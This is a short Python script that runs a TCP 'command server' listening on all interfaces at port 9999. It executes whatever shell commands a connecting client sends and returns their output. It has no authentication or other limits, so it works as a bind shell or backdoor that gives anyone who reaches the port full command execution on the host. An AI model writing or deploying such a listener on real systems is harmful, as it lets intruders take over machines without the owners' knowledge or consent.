import socket
import subprocess

HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 9999       # Arbitrary non-privileged port

def handle_client(conn, addr):
    print(f"[+] Connected by {addr}")
    conn.send(b"Welcome to the command server. Type commands:\n")
    try:
        while True:
            conn.send(b"\n> ")
            cmd = conn.recv(1024).decode().strip()
            if not cmd:
                break
            if cmd.lower() in ("exit", "quit"):
                conn.send(b"Goodbye!\n")
                break

            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = e.output

            conn.send(output or b"[No output]\n")
    finally:
        conn.close()
        print(f"[-] Disconnected {addr}")

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.bind((HOST, PORT))
        server.listen(5)
        print(f"[*] Listening on {HOST}:{PORT}...")
        while True:
            conn, addr = server.accept()
            handle_client(conn, addr)

if __name__ == '__main__':
    start_server()

